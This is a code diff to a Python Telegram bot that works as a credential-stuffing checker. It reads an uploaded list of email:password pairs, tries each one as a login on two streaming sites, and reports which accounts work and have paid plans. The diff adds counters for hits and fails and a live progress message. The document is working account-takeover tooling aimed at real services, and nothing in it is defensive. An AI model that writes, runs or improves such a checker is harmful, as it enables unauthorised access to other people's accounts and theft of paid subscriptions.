@@ -15,6 +15,10 @@ def find_between( s, first, last ):
     except ValueError:
         return ""
 
+def count_lines(filename):
+    with open(filename, 'r') as f:
+        return len(f.readlines())
+
 @Client.on_message(filters.command(["hot", "make"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
 async def gen(Client , message):
     try:
@@ -22,10 +26,15 @@ async def gen(Client , message):
             if message.reply_to_message.document:
                 if message.reply_to_message.document.file_name.endswith(".txt"):
                     await message.reply_to_message.download("accounts.txt")
-                    time.sleep(3)
-                    await message.reply_text("Downloading file...")
+                    time.sleep(1)
+                    msg = await message.reply_text("Downloading file...")
                     with open("downloads/accounts.txt", "r") as f:
-                        for line in f:
+                        le = count_lines("downloads/accounts.txt")
+                        flizhits = 0
+                        flizfails = 0
+                        hothits = 0
+                        hotfails = 0
+                        for i, line in enumerate(f, start=1):
                             if not line.strip():
                                 break
                             else:
@@ -43,9 +52,11 @@ async def gen(Client , message):
                                 b = r.post("https://fliz.in/login", data=data)
                                 print(email+":"+password)
                                 if "The email or the password is invalid. Please try again." in b.text:
+                                            flizfails += 1
                                             fliz = "FALSE"
                                 elif "Logout" in b.text:
                                     if "Current Plan" in b.text:
+                                        flizhits += 1
                                         fliz = "TRUE"
                                     else:
                                         fliz = "Free"
@@ -59,12 +70,15 @@ async def gen(Client , message):
                                 }
                                 d = r.post('https://hotx.vip/login', data=data)
                                 if "These credentials do not match our records." in d.text:
+                                    hotfails += 1
                                     hot = "FALSE"
                                 elif "Logout" in d.text:
                                     if "Current Plan" in d.text:
+                                        hothits += 1
                                         hot = "TRUE"
                                     else:
                                         hot = "FREE"
+                                await msg.edit_text(f"Fliz Hits:{flizhits} Fliz Fails:{flizfails} Hot Hits:{hothits} Hot Fails:{hotfails} Total Accounts:{le}</b>") 
                                 if(fliz == "TRUE" and hot == "TRUE"):
                                     await message.reply_text("Email: "+email+" Password: "+password+" \nFliz: "+fliz+" \nHot: "+hot)
                                 elif(fliz == "TRUE" and hot == "FALSE"):
